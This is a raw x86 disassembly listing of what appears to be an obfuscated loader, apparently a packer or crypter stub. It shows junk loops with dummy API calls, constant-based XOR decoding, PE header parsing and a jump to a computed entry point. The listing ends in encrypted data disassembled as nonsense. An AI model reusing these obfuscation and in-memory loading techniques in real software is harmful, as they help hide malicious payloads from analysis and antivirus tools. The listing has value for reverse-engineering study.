  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4245ae
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4245ae,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4245ba,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4245b6,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4245ca,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4245ca
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4245c2,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4245be,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4245c6,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4245b6,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4245ae,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4245b6,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4245c2,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4245ae,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	sar    BYTE PTR [esi],0x47
  40a7b7:	mov    edi,0x7e7e2505
  40a7bc:	lds    edi,FWORD PTR [edi+0x7e]
  40a7bf:	jle    0x40a75f
  40a7c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7c2:	imul   BYTE PTR [esi]
  40a7c4:	loope  0x40a783
  40a7c6:	jge    0x40a840
  40a7c8:	adc    eax,0x83d5ea77
  40a7cd:	cmp    edx,DWORD PTR [ecx+0x6a]
  40a7d0:	pop    eax
  40a7d1:	mov    esi,0x28c42914
  40a7d6:	gs sbb eax,0xacf368f0
  40a7dc:	pop    ebx
  40a7dd:	jns    0x40a7b4
  40a7df:	lods   al,BYTE PTR ds:[esi]
  40a7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7e1:	cli    
  40a7e2:	inc    esi
  40a7e3:	cmc    
  40a7e4:	lods   eax,DWORD PTR ds:[esi]
  40a7e5:	jecxz  0x40a821
  40a7e7:	xor    al,0xdc
  40a7e9:	and    DWORD PTR [ebx],esi
  40a7eb:	les    esi,FWORD PTR [esi]
  40a7ed:	imul   ebp,DWORD PTR [eax-0x31],0x714f025a
  40a7f4:	sub    ah,0x6e
  40a7f7:	jno    0x40a81a
  40a7f9:	xlat   BYTE PTR ds:[ebx]
  40a7fa:	fidiv  DWORD PTR [esi+edx*2-0x25]
  40a7fe:	es (bad) 
  40a800:	aam    0xcd
  40a802:	inc    esi
  40a803:	mov    cl,0x8b
  40a805:	cdq    
  40a806:	push   ds
  40a807:	lods   al,BYTE PTR ds:[esi]
  40a808:	sahf   
  40a809:	and    DWORD PTR [edx+edi*4-0x595e34e0],0x3f4b2883
  40a814:	jl     0x40a7fe
